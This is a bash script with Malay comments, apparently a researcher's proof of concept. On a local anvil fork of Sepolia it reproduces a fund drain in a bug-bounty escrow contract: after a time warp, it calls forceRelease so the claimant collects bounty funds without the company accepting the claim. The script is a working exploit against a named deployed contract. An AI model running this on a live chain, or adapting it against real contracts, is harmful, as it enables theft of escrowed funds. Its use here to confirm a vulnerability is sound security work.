#!/usr/bin/env bash
# ce5_fork.sh — bukti REPEATABLE CE-5 atas bytecode v0.6 SEBENAR (forked Sepolia).
# AXIOM-CORE: percaya terminal, bukan dakwaan. Skrip ni reproduce drain yang black dah
# sahkan 12 Nov 2026 (forceRelease bogus-preimage claim → +0.000975 ETH, status 1).
#
# PRASYARAT: foundry (anvil+cast), .zkb-test.env (RESEARCHER_KEY test-researcher #4),
#            bounty #4 masih PendingCompany pada v0.6 (kalau dah settle, tukar ID / buat baru).
# JALAN:  bash ce5_fork.sh
set -euo pipefail

RPC="${SEPOLIA_RPC:-https://ethereum-sepolia-rpc.publicnode.com}"
C="${C:-0x32F8e9Ba3b43586A34F9ba0CB2325433a23943F6}"   # v0.6 LIVE
BID="${BID:-4}"
ENVF="${ENVF:-.zkb-test.env}"
L="http://127.0.0.1:8545"

[ -f "$ENVF" ] || { echo "FATAL: $ENVF tak jumpa (RESEARCHER_KEY)"; exit 1; }
# shellcheck disable=SC1090
set -a; source "$ENVF"; set +a
: "${RESEARCHER_KEY:?RESEARCHER_KEY tak di-set dalam $ENVF}"

echo "== R0: baca state #$BID atas chain SEBENAR (jangan percaya ingatan) =="
TUP=$(cast call "$C" \
  "getBounty(uint256)((address,uint256,uint256,uint256,uint256,uint8,uint8,address,uint256))" \
  "$BID" --rpc-url "$RPC")
echo "getBounty($BID) = $TUP"
STATE=$(echo "$TUP" | tr -d '()' | awk -F', ' '{print $7}')
echo "state=$STATE (2=PendingCompany dijangka)"
[ "$STATE" = "2" ] || echo "AMARAN: #$BID bukan PendingCompany — PoC mungkin tak relevan, pertimbang bounty baru."

echo "== Fork head terkini (elak pruned-history: Pengajaran publicnode) =="
pkill anvil 2>/dev/null || true; sleep 1
BN=$(cast block-number --rpc-url "$RPC"); echo "head=$BN"
anvil --fork-url "$RPC" --fork-block-number "$((BN-5))" --port 8545 > /tmp/anvil_ce5.log 2>&1 &
ANVIL_PID=$!
trap 'kill $ANVIL_PID 2>/dev/null || true' EXIT
for i in $(seq 1 15); do
  if cast block-number --rpc-url "$L" >/dev/null 2>&1; then break; fi
  sleep 1
done
cast block-number --rpc-url "$L" >/dev/null 2>&1 || { echo "FATAL anvil tak naik:"; cat /tmp/anvil_ce5.log; exit 1; }
echo "anvil HIDUP: $(cast block-number --rpc-url "$L")"

R=$(cast wallet address --private-key "$RESEARCHER_KEY")
echo "claimant (test-researcher, cuma run prove.js nilai RAWAK — UJI-0) = $R"

echo "== Warp lepas unlock (deadline+claimTimeout) =="
cast rpc evm_increaseTime 1209600 --rpc-url "$L" >/dev/null   # +14 hari
cast rpc evm_mine --rpc-url "$L" >/dev/null
echo "fork now = $(cast block latest --rpc-url "$L" | awk '/timestamp/{print $2}')"

BEFORE=$(cast balance "$R" --rpc-url "$L")
echo "baki SEBELUM = $BEFORE"
echo "== forceRelease($BID) — v0.6 bayar claimant tanpa companyAccept =="
cast send "$C" "forceRelease(uint256)" "$BID" --rpc-url "$L" --private-key "$RESEARCHER_KEY" >/dev/null
AFTER=$(cast balance "$R" --rpc-url "$L")
echo "baki SELEPAS = $AFTER"

python3 - "$BEFORE" "$AFTER" <<'PY'
import sys
b,a=int(sys.argv[1]),int(sys.argv[2])
d=a-b
print(f"\nDELTA = {d} wei ({d/1e18:.9f} ETH)")
print("CE-5 CONFIRMED: claimant tanpa exploit sedut dana company." if d>0
      else "TIADA drain — siasat (state? warp? ID?).")
PY
echo "(fork je — chain SEBENAR tak tersentuh. anvil auto-kill bila skrip tamat.)"
